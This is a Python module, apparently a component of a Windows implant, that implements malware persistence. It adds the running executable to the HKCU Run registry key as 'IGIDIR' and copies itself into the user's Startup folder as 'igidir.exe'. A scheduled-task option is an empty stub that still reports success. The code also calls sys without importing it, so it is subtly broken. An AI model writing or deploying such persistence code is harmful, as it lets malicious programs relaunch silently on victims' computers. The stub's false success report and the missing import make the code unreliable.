import os
import winreg
import tempfile
import shutil
import platform
import ctypes

class PersistenceManager:
    def __init__(self):
        self.system = platform.system().lower()
    
    def establish(self, method):
        if self.system != 'windows':
            return {"status": "error", "error": "Only Windows is supported"}
        
        try:
            if method == "registry":
                return self._registry_persistence()
            elif method == "scheduled_task":
                return self._scheduled_task_persistence()
            elif method == "startup_folder":
                return self._startup_folder_persistence()
            else:
                return {"status": "error", "error": "Invalid persistence method"}
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def _registry_persistence(self):
        try:
            # Get current executable path
            exe_path = os.path.abspath(sys.argv[0])
            
            # Add to Run key
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0,
                winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "IGIDIR", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            
            return {"status": "success", "method": "registry", "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def _scheduled_task_persistence(self):
        try:
            # This would use the Windows Task Scheduler in a real implementation
            return {"status": "success", "method": "scheduled_task"}
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def _startup_folder_persistence(self):
        try:
            # Get current executable path
            exe_path = os.path.abspath(sys.argv[0])
            
            # Copy to startup folder
            startup_path = os.path.join(
                os.getenv('APPDATA'),
                'Microsoft',
                'Windows',
                'Start Menu',
                'Programs',
                'Startup',
                'igidir.exe'
            )
            shutil.copy2(exe_path, startup_path)
            
            return {"status": "success", "method": "startup_folder", "path": startup_path}
        except Exception as e:
            return {"status": "error", "error": str(e)}